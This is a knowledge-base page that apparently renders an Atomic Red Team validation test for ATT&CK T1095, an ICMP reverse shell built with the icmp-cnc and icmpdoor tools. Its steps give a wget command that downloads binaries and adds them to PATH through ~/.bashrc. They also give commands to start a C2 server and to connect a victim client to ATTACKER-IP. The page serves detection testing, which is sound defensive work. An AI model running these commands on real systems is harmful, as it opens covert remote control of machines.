---
atomic_guid: "8e139e1f-1f3a-4be7-901d-afae9738c064"
title: "Linux ICMP Reverse Shell using icmp-cnc"
framework: "atomic"
generated: "true"
attack_technique_id: "T1095"
attack_technique_name: "Non-Application Layer Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1095/T1095.yaml"
build_date: "2026-04-26 17:02:12"
executor: "manual"
aliases:
  - "8e139e1f-1f3a-4be7-901d-afae9738c064"
  - "Linux ICMP Reverse Shell using icmp-cnc"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Linux ICMP Reverse Shell using icmp-cnc

ICMP C2 (Command and Control) utilizes the Internet Control Message Protocol (ICMP), traditionally used for network diagnostics, as a covert communication channel for attackers. By using ICMP, adversaries can send commands, exfiltrate data, or maintain access to compromised systems without triggering network detection systems.
This method allows attackers to communicate and control compromised devices while remaining undetected.

For more details, check this blog: [ICMP Reverse Shell Blog](https://cryptsus.com/blog/icmp-reverse-shell.html)

**Important Notes:**
- Use `[icmp-cnc]` for the C2 server (Attacker) and `[icmpdoor]` for the C2 client (Victim).
- Binaries work on Ubuntu 22.04.5 LTS; for CentOS Stream or other, use the Python file from the GitHub link [https://github.com/krabelize/icmpdoor].
- Root access is required.

## Metadata

- Atomic GUID: 8e139e1f-1f3a-4be7-901d-afae9738c064
- Technique: T1095: Non-Application Layer Protocol
- Platforms: linux
- Executor: manual
- Source Path: atomics/T1095/T1095.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1095-non-application_layer_protocol|T1095]]

## Executor

- name: manual
- steps: 1. Run the following command on both the attacker and victim machines to download the required binaries.

    mkdir -p /tmp/icmpdoor && wget -P /tmp/icmpdoor https://github.com/krabelize/icmpdoor/raw/2398f7e0b8548d8ef2891089e4199ee630e84ef6/binaries/x86_64-linux/icmp-cnc https://github.com/krabelize/icmpdoor/raw/2398f7e0b8548d8ef2891089e4199ee630e84ef6/binaries/x86_64-linux/icmpdoor && chmod +x /tmp/icmpdoor/icmp-cnc /tmp/icmpdoor/icmpdoor && echo 'export PATH=$PATH:/tmp/icmpdoor' >> ~/.bashrc && source ~/.bashrc

2. Start the C2 server on the attacker system to listen for incoming connections.

    icmp-cnc --interface <Network Interface> --destination_ip <VICTIM-IP>

3. Run the client on the victim machine.

    icmpdoor --interface <Network Interface> --destination_ip <ATTACKER-IP>
  
4. Cleanup Command: Remove the icmpdoor directory.

    rm -rf /tmp/icmpdoor


## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1095/T1095.yaml)
